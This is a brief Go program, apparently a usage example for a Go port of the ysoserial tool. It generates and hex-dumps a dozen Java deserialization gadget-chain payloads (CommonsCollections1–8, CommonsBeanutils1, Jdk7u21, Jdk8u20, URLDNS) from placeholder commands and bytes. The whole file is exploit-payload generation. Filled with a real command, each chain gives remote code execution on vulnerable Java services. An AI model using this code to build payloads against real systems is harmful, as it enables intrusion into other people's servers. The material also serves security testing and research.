package main

import (
	"encoding/hex"
	"fmt"

	"github.com/comwrg/ysoserial"
)

func main() {
	fmt.Println(hex.Dump(ysoserial.URLDNS("example domain")))
	fmt.Println(hex.Dump(ysoserial.CommonsBeanutils1([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections1("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections2([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections3([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections4([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections5("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections6("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections7("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections8([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.Jdk7u21([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.Jdk8u20([]byte("example bytes"))))
}
